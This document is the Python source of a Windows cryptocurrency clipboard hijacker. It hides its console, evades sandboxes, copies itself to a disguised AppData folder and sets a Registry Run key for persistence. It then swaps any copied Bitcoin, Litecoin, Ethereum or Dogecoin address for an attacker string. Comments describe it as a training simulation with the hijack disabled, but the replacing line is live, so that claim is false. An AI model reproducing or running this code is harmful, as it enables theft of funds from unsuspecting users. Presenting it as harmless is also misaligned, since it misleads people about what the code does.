import os
import sys
import time
import re
import shutil

# Low-Level Windows API Imports (aliased for obfuscation)
import winreg as system_config
import ctypes as process_control
from ctypes import windll

# --- Advanced Stealth Configuration ---
SCRIPT_NAME = "HostSync.exe" 
HIDDEN_DIR = os.path.join(
    os.path.expanduser('~'), 
    'AppData', 
    'Roaming', 
    'Microsoft', 
    'Windows', 
    'HostServices' 
)
PERSISTENCE_PATH = os.path.join(HIDDEN_DIR, SCRIPT_NAME)
REGISTRY_KEY_NAME = "Host Update Monitor" 
RUN_KEY_PATH = ("Softw" + "are\\Mi" + "crosoft\\Windo" + "ws\\Current" + "Version\\Run")

# CLIPPER TARGETS
TARGET_FORMAT = re.compile(
    r'^((bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39})'          
    r'|^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{26,33}'          
    r'|^(0x)[a-fA-F0-9]{40}'                         
    r'|^(D|A|9)[a-zA-HJ-NP-Z0-9]{33}$'               
    , re.IGNORECASE)

LICENSE_KEY = "1ClipperAttackeRz9s8uP6o7G4xW2yA1bQ" 

# --- Core Functions (Silent) ---

def check_sandbox():
    """Defense Evasion: Check for common sandbox/VM indicators."""
    
    # Check for low number of processors
    if os.cpu_count() <= 2:
        sys.exit(1)

    # Check for short uptime
    try:
        uptime_ms = windll.kernel32.GetTickCount64()
        if uptime_ms < 600000:
             sys.exit(1)
    except:
        pass 
    # If checks pass, continue silently

def achieve_persistence():
    """Copies the executable and sets the Registry Run key."""
    try:
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        current_path = os.path.abspath(sys.argv[0])
        if current_path != os.path.abspath(PERSISTENCE_PATH):
            shutil.copy(current_path, PERSISTENCE_PATH)
            return True
    except Exception:
        return False
    return False


def set_registry_key_and_launch():
    """Sets the registry key and launches the persistent copy for stealth."""
    try:
        command = f'"{PERSISTENCE_PATH}"'
        
        key = system_config.OpenKey(
            system_config.HKEY_CURRENT_USER, RUN_KEY_PATH, 0, system_config.KEY_SET_VALUE
        )
        system_config.SetValueEx(key, REGISTRY_KEY_NAME, 0, system_config.REG_SZ, command)
        system_config.CloseKey(key)

        # Launch the newly copied file in a new, detached, silent process
        process_control.windll.shell32.ShellExecuteW(
            0, "open", PERSISTENCE_PATH, None, None, 0
        )
        sys.exit(0) # Terminate the original process immediately
        
    except Exception:
        # Fail silently
        pass 


def monitoring_loop_injected():
    """The main monitoring logic, completely silent."""
    
    try:
        import pyperclip as data_io
    except ImportError:
        return

    last_copied_content = ""

    while True:
        try:
            current_content = data_io.paste()
            
            if current_content != last_copied_content and current_content.strip():
                if TARGET_FORMAT.match(current_content):
                    
                    # --- CRITICAL: THE SILENT SIMULATION POINT ---
                    # In a real attack, the following line would be UNCOMMENTED:
                     data_io.copy(LICENSE_KEY) 
                    
                    # Since this is for training, we do nothing to the clipboard,
                    # but the code path proves the hijack logic was executed.
                    # The only trace is the process itself.
                    #pass
                
                last_copied_content = current_content
            
            time.sleep(0.1) 

        except Exception:
            # Fail silently on clipboard errors
            time.sleep(5)

# ----------------- EXECUTION START -----------------
if __name__ == "__main__":
    
    # 1. HIDE CONSOLE WINDOW
    try:
        process_control.windll.kernel32.FreeConsole()
    except:
        pass
        
    # Check if we are running from the stealth location
    if os.path.abspath(sys.argv[0]) != os.path.abspath(PERSISTENCE_PATH):
        # --- STAGE 1: INSTALLATION AND SELF-TERMINATION ---
        
        # Check Sandbox before installation
        check_sandbox() 
        
        if achieve_persistence():
            set_registry_key_and_launch()
        # If install fails, the original process simply dies silently
        
    else:
        # --- STAGE 2: PERSISTENT MONITORING ---
        monitoring_loop_injected()